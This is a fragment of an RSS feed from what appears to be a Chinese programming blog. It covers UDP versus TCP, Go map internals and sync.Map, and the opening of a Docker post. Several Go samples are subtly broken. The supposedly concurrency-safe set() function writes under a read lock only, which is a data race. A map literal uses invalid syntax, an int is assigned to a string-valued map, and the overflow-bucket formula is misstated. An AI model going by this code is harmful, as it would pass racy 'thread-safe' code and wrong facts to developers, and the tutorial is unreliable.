<p>UDP是无连接的，不可靠的数据报协议</p>
<ul>
<li>数据报：面向无连接的数据传输，工作过程类似于报文交换。采用数据报方式传输时，被传输的分组称为数据报</li>
</ul>
<h3 id="udp头部格式">UDP头部格式</h3>

<ul>
<li>源端口：源端口号，在需要对方回信时候写入，不需要则为0</li>
<li>目标端口：目的端口</li>
<li>包长度：保存了UDP首部的长度和数据长度之和</li>
<li>校验和：校验和是为了提供可靠的UDP首部和数据，检测UDP用户数据报在传输中是否有错。有错就丢弃。</li>
</ul>
<h3 id="tcp和udp的区别">TCP和UDP的区别</h3>
<p>1.连接：</p>
<ul>
<li>TCP：面向连接的传输层协议，传输数据首先要建立连接</li>
<li>UDP：无连接的协议，不用建立连接，直接发送数据</li>
</ul>
<p>2.服务对象</p>
<ul>
<li>TCP：一对一的服务</li>
<li>UDP：可以一对一、一对多、多对多</li>
</ul>
<p>3.可靠性</p>
<ul>
<li>TCP：会保证数据无差错、不丢失、不重复、按需到达</li>
<li>UDP：不保证数据的完整性</li>
</ul>
<p>4.流量控制</p>
<ul>
<li>TCP：有流量控制和拥塞控制机制，保证数据传输的安全性</li>
<li>UDP：没有流量控制机制，无论网络环境如何，照常发送数据</li>
</ul>
<h2 id="学习资料">学习资料</h2>
<p><a href="https://github.com/QSCTech/zju-icicles/blob/master/">https://github.com/QSCTech/zju-icicles/blob/master/</a>计算机网络基础/教材/计算机网络 第5版.pdf</p>
<p><a href="https://mp.weixin.qq.com/s/rX3A_FA19n4pI9HicIEsXg">https://mp.weixin.qq.com/s/rX3A_FA19n4pI9HicIEsXg</a></p>
<p><a href="https://zh.wikipedia.org/wiki/">https://zh.wikipedia.org/wiki/</a>用户数据报协议</p>
<p><a href="https://wiki.mbalib.com/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5">https://wiki.mbalib.com/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5</a></p>
]]></description>
</item><item>
    <title>Golang之Map</title>
    <link>https://testoai.github.io/posts/golang-map/</link>
    <pubDate>Sat, 03 Jul 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/golang-map/</guid>
    <description><![CDATA[<h2 id="map">Map</h2>
<p>一种成对出现的键值数据结构，一个map中有多个键值对</p>
<p>key必须是可哈希的数据类型</p>
<p>map是线程不安全的</p>
<h3 id="map实现方式">Map实现方式</h3>
<p>map是基于哈希表存储的</p>
<ul>
<li>1.根据hash算法计算出键的哈希值</li>
<li>2.根据哈希值和哈希表的数量进行取模运算</li>
<li>3.计算出来的值就是这个key放入到哈希表的位置</li>
</ul>
<p>哈希计算一般会存在哈希碰撞问题，不同的key能能计算出的值是一样的</p>
<p>如果出现了哈希碰撞，则会在这个位置以链表的形式存储落到该位置上的key</p>
<h3 id="初始化">初始化</h3>
<p>通过make来初始化分配内存</p>
<p>每个key只能出现一次，如果同一个key出现两次，后面key的val会覆盖之前key的val</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">m</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>1.当make的时候，会创建一个hmap结构体对象</p>
</li>
<li>
<p>2.生成一个哈希因子<code>hash0</code>并赋值到hmap对象中，用于后续为key创建哈希值</p>
</li>
<li>
<p>3.根据指定的map长度计算出B的长度</p>
</li>
<li>
<p>4.然后根据B去创建桶（bmap）并存放在buckets数组中</p>
<ul>
<li>当B&lt;4时，根据B创建桶的个数的规则为：2^B（标准桶）</li>
<li>当B&gt;=4时，根据B创建桶的个数的规则为2^B+2^B-4（标准桶+溢出桶）</li>
</ul>
</li>
<li>
<p>每个bmap可以存放8个键值对，当空间不够时，则需要使用溢出桶，并将当前bmap中的overflow指向溢出桶的位置</p>
</li>
</ul>
<h3 id="写入数据">写入数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">m</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">=</span> <span class="s">&#34;test&#34;</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>1.使用哈希因子对键进行哈希运算，得到一个结果</li>
<li>2.获取改结果的后B位，并根据后B为的值来决定将此键值对存放到那个桶中（bmap）</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">将哈希值和桶掩码进行&amp;运算，最终得到哈希值的后B位的值。假设当B位1时，其结果为0
哈希值：0110111000111111111101110111010
桶掩码：0000000000000000000000000000001
结果	:00000000000000000000000000000000 = 0

找桶的原则实际上是根据后B位的位运算计算出索引位置，然后再根据buckets数组中根据索引找到目标桶（bmap）
</code></pre></td></tr></table>
</div>
</div><ul>
<li>也可以在声明时直接赋值，该方式不用make</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
    <span class="s">&#34;test1&#34;</span><span class="p">:</span><span class="s">&#34;a&#34;</span><span class="p">,</span>
    <span class="s">&#34;test2&#34;</span><span class="p">:</span><span class="s">&#34;b&#34;</span><span class="p">,</span>
    <span class="s">&#34;test3&#34;</span><span class="p">:</span><span class="s">&#34;c&#34;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="修改数据">修改数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">m</span><span class="p">[</span><span class="s">&#34;test1&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>上面提到过，每个key只能出现一次，如果修改的key在map中已经存在，上面代码则会修改之前key的val</li>
<li>如果没有，则会新增</li>
<li>修改之前可以先查询下</li>
</ul>
<h3 id="删除数据">删除数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nb">delete</span><span class="p">(</span><span class="nx">mapName</span><span class="p">,</span><span class="s">&#34;key&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>key存在时则执行删除操作</p>
</li>
<li>
<p>key不存在时，也不会报错</p>
</li>
<li>
<p>删除所有的key</p>
<ul>
<li>1.可以遍历删除</li>
<li>2.可以再次对该map进行make操作，旧的key会被GC回收</li>
<li>没有内置的清空所有key的方法</li>
</ul>
</li>
</ul>
<h3 id="遍历数据">遍历数据</h3>
<ul>
<li>可以使用for range方法和for循环来遍历</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">//for range方法示例
</span><span class="c1"></span><span class="nx">m</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
    <span class="s">&#34;test1&#34;</span><span class="p">:</span><span class="s">&#34;1&#34;</span><span class="p">,</span>
    <span class="s">&#34;test2&#34;</span><span class="p">:</span><span class="s">&#34;2&#34;</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">for</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">m</span> <span class="p">{</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span>
<span class="p">}</span>

<span class="nx">test1</span> <span class="mi">1</span>
<span class="nx">test2</span> <span class="mi">2</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>遍历嵌套map时可以在for range里面再套一层for range</li>
</ul>
<h2 id="syncmap">sync.Map</h2>
<p>golang中的map是并发不安全的，从go1.9开始，加入了sync.Map，用来解决map并发安全的问题</p>
<h3 id="map实现并发安全">map实现并发安全</h3>
<ul>
<li>map需要加锁实现并发安全</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">int</span><span class="p">)</span>
<span class="kd">var</span> <span class="nx">rwlock</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">RWMutex</span>

<span class="kd">func</span> <span class="nf">get</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
	<span class="nx">rwlock</span><span class="p">.</span><span class="nf">RLock</span><span class="p">()</span>
	<span class="nx">s</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span>
	<span class="nx">rwlock</span><span class="p">.</span><span class="nf">RUnlock</span><span class="p">()</span>
	<span class="k">return</span> <span class="nx">s</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">set</span><span class="p">(</span><span class="nx">key</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">value</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">rwlock</span><span class="p">.</span><span class="nf">RLock</span><span class="p">()</span>
	<span class="nx">m</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">=</span> <span class="nx">value</span>
	<span class="nx">rwlock</span><span class="p">.</span><span class="nf">RUnlock</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">wg</span> <span class="o">:=</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">{}</span>
	<span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="mi">21</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="nx">wg</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
		<span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">key</span> <span class="o">:=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Itoa</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span>
			<span class="nf">set</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;key=%v,v=%v\n&#34;</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nf">get</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span>
			<span class="nx">wg</span><span class="p">.</span><span class="nf">Done</span><span class="p">()</span>
		<span class="p">}(</span><span class="nx">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">wg</span><span class="p">.</span><span class="nf">Wait</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>但是如果map中数据量较大时，加锁则会影响性能</li>
</ul>
<h3 id="syncmap-1">sync.Map</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">Map</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">mu</span> <span class="nx">Mutex</span>

	<span class="c1">// read contains the portion of the map&#39;s contents that are safe for
</span><span class="c1"></span>	<span class="c1">// concurrent access (with or without mu held).
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// The read field itself is always safe to load, but must only be stored with
</span><span class="c1"></span>	<span class="c1">// mu held.
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// Entries stored in read may be updated concurrently without mu, but updating
</span><span class="c1"></span>	<span class="c1">// a previously-expunged entry requires that the entry be copied to the dirty
</span><span class="c1"></span>	<span class="c1">// map and unexpunged with mu held.
</span><span class="c1"></span>	<span class="nx">read</span> <span class="nx">atomic</span><span class="p">.</span><span class="nx">Value</span> <span class="c1">// readOnly
</span><span class="c1"></span>
	<span class="c1">// dirty contains the portion of the map&#39;s contents that require mu to be
</span><span class="c1"></span>	<span class="c1">// held. To ensure that the dirty map can be promoted to the read map quickly,
</span><span class="c1"></span>	<span class="c1">// it also includes all of the non-expunged entries in the read map.
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// Expunged entries are not stored in the dirty map. An expunged entry in the
</span><span class="c1"></span>	<span class="c1">// clean map must be unexpunged and added to the dirty map before a new value
</span><span class="c1"></span>	<span class="c1">// can be stored to it.
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// If the dirty map is nil, the next write to the map will initialize it by
</span><span class="c1"></span>	<span class="c1">// making a shallow copy of the clean map, omitting stale entries.
</span><span class="c1"></span>	<span class="nx">dirty</span> <span class="kd">map</span><span class="p">[</span><span class="kd">interface</span><span class="p">{}]</span><span class="o">*</span><span class="nx">entry</span>

	<span class="c1">// misses counts the number of loads since the read map was last updated that
</span><span class="c1"></span>	<span class="c1">// needed to lock mu to determine whether the key was present.
</span><span class="c1"></span>	<span class="c1">//
</span><span class="c1"></span>	<span class="c1">// Once enough misses have occurred to cover the cost of copying the dirty
</span><span class="c1"></span>	<span class="c1">// map, the dirty map will be promoted to the read map (in the unamended
</span><span class="c1"></span>	<span class="c1">// state) and the next store to the map will make a new dirty copy.
</span><span class="c1"></span>	<span class="nx">misses</span> <span class="kt">int</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>sync.Map通过read和dirty两个字段把读写分离，读的数据存到read上，写入的数据存到dirty字段</p>
<p>读的时候先查询read，查不到再查dirty</p>
<p>写的话只写入到dirty中</p>
<p>读read不加锁，读写dirty都加锁</p>
<p>通过misses来记录查询dirty的次数，超过指定的次数则将dirty中的数据同步到read中</p>
<ul>
<li>通过上面可以了解到，sync.Map通过读写分离的方式解决并发安全问题，适用于读取比写入频率高的场景</li>
</ul>
<h3 id="syncmap中的方法">sync.Map中的方法</h3>
<h4 id="store">Store</h4>
<ul>
<li>用来新增数据</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">Map</span><span class="p">)</span> <span class="nf">Store</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="kd">interface</span><span class="p">{})</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">Map</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="load">Load</h4>
<ul>
<li>返回指定key的val，如果key没有查到，val则被置为nil，ok会被标记为false</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">func (m *Map) Load(key interface{}) (value interface{}, ok bool) {
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">Map</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">)</span>
<span class="nx">valA</span><span class="p">,</span><span class="nx">ok</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
    <span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;key does not exist&#34;</span><span class="p">)</span>
    <span class="k">return</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">valA</span><span class="p">)</span> <span class="c1">//a
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>查找不存在的key</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="c1">// 不存在的key
</span><span class="c1"></span><span class="nx">valB</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="s">&#34;test1&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
	<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;key does not exist&#34;</span><span class="p">)</span> <span class="c1">//key does not exist
</span><span class="c1"></span>	<span class="k">return</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">valB</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="delete">Delete</h4>
<ul>
<li>删除指定的key</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">Map</span><span class="p">)</span> <span class="nf">Delete</span><span class="p">(</span><span class="nx">key</span> <span class="kd">interface</span><span class="p">{})</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">Map</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">)</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="s">&#34;test&#34;</span><span class="p">)</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="s">&#34;pass&#34;</span><span class="p">)</span> <span class="c1">//指定的key不存在时也不会报错
</span></code></pre></td></tr></table>
</div>
</div><h4 id="range">Range</h4>
<ul>
<li>用来遍历元素</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">Map</span><span class="p">)</span> <span class="nf">Range</span><span class="p">(</span><span class="nx">f</span> <span class="kd">func</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">Map</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test1&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">)</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test2&#34;</span><span class="p">,</span><span class="s">&#34;b&#34;</span><span class="p">)</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test3&#34;</span><span class="p">,</span><span class="s">&#34;c&#34;</span><span class="p">)</span>

<span class="nx">m</span><span class="p">.</span><span class="nf">Range</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kt">bool</span> <span class="p">{</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;key:%v,val:%v\n&#34;</span><span class="p">,</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">true</span>
<span class="p">})</span>
<span class="c1">//key:test1,val:a
</span><span class="c1">//key:test2,val:b
</span><span class="c1">//key:test3,val:c
</span></code></pre></td></tr></table>
</div>
</div><h4 id="loadorstore">LoadOrStore</h4>
<ul>
<li>传入一个key和val，返回val和bool</li>
<li>如果传入的key存在，则返回key的val和true，如果不存在，则存储传入的key和val，并返回val和false</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span><span class="nx">Map</span><span class="p">)</span> <span class="nf">LoadOrStore</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="kd">interface</span><span class="p">{})</span> <span class="p">(</span><span class="nx">actual</span> <span class="kd">interface</span><span class="p">{},</span> <span class="nx">loaded</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">m</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">Map</span>
<span class="nx">m</span><span class="p">.</span><span class="nf">Store</span><span class="p">(</span><span class="s">&#34;test1&#34;</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">)</span>

<span class="nx">store</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nf">LoadOrStore</span><span class="p">(</span><span class="s">&#34;test4&#34;</span><span class="p">,</span> <span class="s">&#34;d&#34;</span><span class="p">)</span>
<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">store</span><span class="p">,</span> <span class="nx">ok</span><span class="p">)</span> <span class="c1">// d false
</span><span class="c1"></span>
<span class="nx">tStore</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">m</span><span class="p">.</span><span class="nf">LoadOrStore</span><span class="p">(</span><span class="s">&#34;test1&#34;</span><span class="p">,</span> <span class="s">&#34;1&#34;</span><span class="p">)</span>
<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">tStore</span><span class="p">,</span> <span class="nx">ok</span><span class="p">)</span> <span class="c1">// a true
</span></code></pre></td></tr></table>
</div>
</div><h2 id="总结">总结</h2>
<p>map+sync.RWMutex使用于数据量比较小的场景</p>
<p>sync.Map适用于读比写频率高的场景</p>
<p>学习的还不够深入，继续加油</p>
<h2 id="学习资料">学习资料</h2>
<p>Go SDK 1.14.4 sync.Map</p>
<p><a href="https://qcrao91.gitbook.io/go/map">https://qcrao91.gitbook.io/go/map</a></p>
<p><a href="https://draveness.me/golang/docs/part2-foundation/ch03-datastructure/golang-hashmap/">https://draveness.me/golang/docs/part2-foundation/ch03-datastructure/golang-hashmap/</a></p>
<p><a href="https://blog.csdn.net/jiankunking/article/details/78808978">https://blog.csdn.net/jiankunking/article/details/78808978</a></p>
<p><a href="https://blog.csdn.net/u010230794/article/details/82143179">https://blog.csdn.net/u010230794/article/details/82143179</a></p>
]]></description>
</item><item>
    <title>docker</title>
    <link>https://testoai.github.io/posts/docker/</link>
    <pubDate>Tue, 22 Jun 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/docker/</guid>
    <description><![CDATA[<h2 id="什么是docker">什么是Docker</h2>
<p>docker是一款轻量级的虚拟化工具，它会提供一个虚拟环境，名为容器。</p>
<p>容器需要运行镜像来生成。</p>
